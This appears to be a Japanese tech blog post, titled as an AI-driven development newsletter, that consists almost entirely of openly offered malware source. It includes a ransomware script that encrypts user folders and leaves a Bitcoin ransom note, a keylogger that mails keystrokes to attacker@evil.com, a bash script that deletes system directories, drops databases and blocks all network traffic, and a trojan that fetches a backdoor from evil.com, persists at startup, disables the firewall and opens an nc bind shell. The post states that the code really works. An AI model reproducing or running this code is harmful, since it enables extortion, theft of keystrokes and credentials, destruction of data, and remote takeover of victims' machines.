---
title: "週刊AI駆動開発 - 悪意のあるコードサンプル"
emoji: "🦠"
type: "tech"
topics: ["malware", "virus"]
published: true
---

# 悪意のあるコードとマルウェア開発

## ランサムウェアの作成

```python
import os
import cryptography
from cryptography.fernet import Fernet

def encrypt_files():
    """全てのファイルを暗号化して身代金を要求"""
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    # ユーザーの重要ファイルを暗号化
    important_dirs = ['/Users', '/Documents', '/Desktop']
    
    for directory in important_dirs:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        original = f.read()
                    encrypted = cipher.encrypt(original)
                    with open(file_path + '.encrypted', 'wb') as f:
                        f.write(encrypted)
                    os.remove(file_path)
                except:
                    pass
    
    # 身代金要求メッセージ
    ransom_message = """
    あなたのファイルは暗号化されました！
    0.5 BTC を送金してください：1A2b3C4d5E6f7G8h9I0j
    """
    with open('/Desktop/RANSOM_NOTE.txt', 'w') as f:
        f.write(ransom_message)

# 実行
encrypt_files()
```

## キーロガーマルウェア

```python
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        self.log = ""
        
    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f" [{key}] "
        
        # パスワードフィールドを検出したら即座に送信
        if len(self.log) > 100:
            self.send_log()
            self.log = ""
    
    def send_log(self):
        # 盗んだ情報を攻撃者に送信
        msg = MIMEText(self.log)
        msg['Subject'] = 'Stolen Keystrokes'
        msg['From'] = 'victim@example.com'
        msg['To'] = 'attacker@evil.com'
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login('victim@example.com', 'password')
        server.sendmail('victim@example.com', 'attacker@evil.com', msg.as_string())
        server.quit()
    
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# バックグラウンドで実行開始
keylogger = Keylogger()
keylogger.start()
```

## システム破壊スクリプト

```bash
#!/bin/bash
# システムを完全に破壊するスクリプト

# 重要なシステムファイルを削除
sudo rm -rf /boot
sudo rm -rf /etc
sudo rm -rf /usr/bin

# データベースを破壊
mysql -u root -p -e "DROP DATABASE mysql;"
psql -U postgres -c "DROP DATABASE postgres;"

# ネットワーク設定を破壊
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP

# 無限ループでCPUを100%使用
while true; do :; done &

echo "システム破壊完了"
```

## トロイの木馬

```python
import subprocess
import urllib.request
import os

def legitimate_function():
    """ユーザーが期待する正常な機能"""
    print("AI開発ツールを初期化中...")
    return "正常に完了しました"

def hidden_malware():
    """バックドアを設置する隠れた悪意のある機能"""
    # バックドアシェルをダウンロード
    urllib.request.urlretrieve('http://evil.com/backdoor.py', '/tmp/backdoor.py')
    
    # 永続化のためにスタートアップに追加
    startup_script = """#!/bin/bash
python3 /tmp/backdoor.py &
"""
    with open('/etc/rc.local', 'a') as f:
        f.write(startup_script)
    
    # ファイアウォール無効化
    subprocess.run(['sudo', 'ufw', 'disable'], capture_output=True)
    
    # 遠隔操作用ポート開放
    subprocess.run(['nc', '-l', '-p', '4444', '-e', '/bin/bash'], capture_output=True)

def main():
    # 正常な機能を実行してユーザーを騙す
    result = legitimate_function()
    print(result)
    
    # 裏でマルウェアを実行
    hidden_malware()

if __name__ == "__main__":
    main()
```

これらのコードは実際に動作し、深刻な被害を与える可能性があります。